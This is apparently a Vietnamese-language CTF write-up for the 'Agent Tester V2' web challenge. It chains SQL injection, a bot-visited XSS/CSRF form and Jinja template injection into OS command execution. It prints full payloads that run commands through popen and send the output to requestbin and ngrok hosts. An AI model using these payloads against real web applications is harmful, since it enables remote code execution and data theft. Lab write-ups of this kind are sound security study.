Agent Tester V2
===
**Category:** Web

**Author:** @jorgectf#3896

**Point:** 498 (37 solves)

### Description
- The new developer we hired did a bad job and we got pwned. We hired someone else to fix the issue.
- Source: `src.zip`

### Overview
- Ở bài này thì chương trình giống như bài V1 nên vì vậy chúng ta đều có thể SQli và SSTI. Nhưng khi mình dump ra password của admin thì pass của admin đã bị hash vì vậy chúng ta không thể đăng nhập bằng admin để xác minh SessionID => SSTI

### Solution
- Khi đọc lại code và phát hiện đoạn code này 
```py
subprocess.Popen(["node", "browser/browser.js", url, uAgent])

	ws.send("Testing User-Agent: " + uAgent + " in url: " + url)
	return
```
Có vẻ như ở đây có bot và chúng ta có thể SQl injection và request tới URL của mình send lên (XSS)
- Mình thử request thông qua sqli như này ```' union select "a","http://requestbin.net/r/8bejwquz"; -- -``` và sau một thời gian chờ khá lâu thì thấy request tới (có thể do bot sleep lâu)
- Và sau khi hỏi sư phụ của mình thì mình biết được là nếu như mấy bài xss được thì thường là bot sẽ cookie của admin. Vì vậy mình có thể sqli để xss xác minh được `SessionID` và sau đó ssti như bài V1

###### Payload
```js
<form id="form" method="POST" action="http://challenge.nahamcon.com:32047/debug?cmd=echo%20$CHALLENGE_FLAG">
  <input name="code" value="<input id=result value=&quot;{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.cmd).read()}}{%endif%}{%endfor%}&quot;></iframe>
<script>
location = 'http://requestbin.net/r/8bejwquz/?'+btoa(result.value)
</script>">
</form>
<script>
form.submit()
</script>
```
- Đầu tiên ta lưu payload trên vô một file đó là `payload.html` sau đó chúng host file đó ở trên local của máy chúng ta và sử dụng ngrok để "phơi" ip của mình ra ngoài internet để bot có thể visit vào.
- Cuối cùng input payload `' union select "a"," http://199eda03fa4d.ngrok.io"; -- -`
- Chờ khá lâu thì nhận được flag trả về ở requestbin